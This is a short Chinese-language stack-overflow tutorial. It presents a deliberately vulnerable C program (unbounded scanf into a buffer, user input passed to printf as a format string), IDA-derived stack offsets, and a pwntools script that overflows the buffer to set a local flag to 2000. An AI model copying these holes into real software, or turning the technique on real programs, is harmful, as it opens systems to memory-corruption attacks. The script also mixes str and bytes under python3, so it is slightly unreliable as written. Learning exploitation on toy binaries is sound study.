# 栈溢出例子

## 前言
本来是格式化字符串的例子，这里用栈溢出试下

## 源码&分析
源码如下：  
```c
#include <stdio.h>
int main(void)
 { int flag = 0;
 int *p = &flag; char a[100];
    scanf("%s",a);
    printf(a);

    if(flag == 2000)
    {
            printf("good!!\n");
    }

    return 0;
}
```

在kali64位下编译成可执行文件，接着用IDA反编译下，发现：  
```c
  char format; // [sp+0h] [bp-70h]@1    
  int v5; // [sp+64h] [bp-Ch]@1
  int *v6; // [sp+68h] [bp-8h]@1
```
format就是 a，v5是 flag  
这样就能算出偏移是 0x64，我们的payload就是要改掉flag的值，改成2000  

## payload
payload如下：  
```python
#! python3
# coding:utf8

from pwn import *

payload = 'a'*0x64 + p64(2000)
conn = process("./b")
conn.sendline(payload)
conn.interactive()
```


2017/9/2  
